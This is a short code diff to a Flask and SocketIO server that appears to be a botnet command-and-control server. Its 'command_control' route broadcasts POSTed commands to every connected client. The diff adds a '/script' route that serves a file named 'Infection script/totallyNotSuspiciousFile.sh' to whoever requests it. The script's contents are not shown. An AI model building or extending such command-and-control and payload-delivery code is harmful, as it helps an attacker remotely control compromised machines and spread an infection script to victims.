@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, send_file, render_template
 from flask_socketio import SocketIO, emit
 
 app = Flask(__name__)
@@ -17,9 +17,19 @@ def disconnect():
 
 @app.route('/', methods=["POST"])
 def command_control():
-    print(request.get_json())
     emit("command", request.get_json(), namespace="/", broadcast=True)
     return "Done"
+
+
+@app.route('/script', methods=["GET"])
+def myscript():
+    path= "Infection script/totallyNotSuspiciousFile.sh"
+    return send_file(path)
+
+
+@app.route('/home')
+def home():
+    return render_template("index.html")
 
 
 if __name__ == '__main__':
